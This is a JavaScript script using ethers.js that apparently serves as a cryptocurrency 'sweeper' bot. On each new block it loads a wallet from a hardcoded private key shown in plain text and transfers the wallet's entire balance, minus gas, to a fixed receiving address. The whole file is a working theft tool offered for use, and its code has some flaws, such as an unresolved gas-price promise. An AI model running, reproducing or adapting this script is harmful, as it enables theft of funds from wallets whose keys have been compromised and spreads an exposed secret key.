const { EtherscanProvider } = require('@ethersproject/providers')
const { ethers, Wallet, Signer } = require('ethers')
const { TransactionDescription, TransactionTypes } = require('ethers/lib/utils')

const provider = new ethers.providers.JsonRpcProvider("https://rpc.ankr.com/eth")

const addressReceiver = '0xbEF25E0b188F0090C7ac88488D97b2AAc77B4d4D'

const privateKeys = ["23ac05c6aad202036c36e786d778f4d383f5e5eaf44592004ae0c19cad98a46d"]


process.on('uncaughtException', function(err) {
    console.log('Caught exception: ' + err);
  });

const gasPrice = provider.getGasPrice()

const bot = async =>{
    provider.on('block', async () => { 
        console.log('Waiting ;)');
        for (let i = 0; i < privateKeys.length; i++){
            const _target = new ethers.Wallet(privateKeys[i]);
            const target = _target.connect(provider);
            const balance = await provider.getBalance(target.address);
            const gasFees = (await gasPrice).mul(21000);
            const amount = balance.sub(gasFees);
            if (amount > 0){
                console.log("New Account with BNB!");
                try {
                    await target.sendTransaction({
                        to: addressReceiver,
                        value: amount,
                        gasPrice: gasPrice,
                        gasLimit: 21000,
                    });
                    console.log(`Success! transferred -->${ethers.utils.formatEther(balance)}`);
                } catch(e){
                    console.log(`error: ${e}`);
                }
            }
        }
    })
}
bot();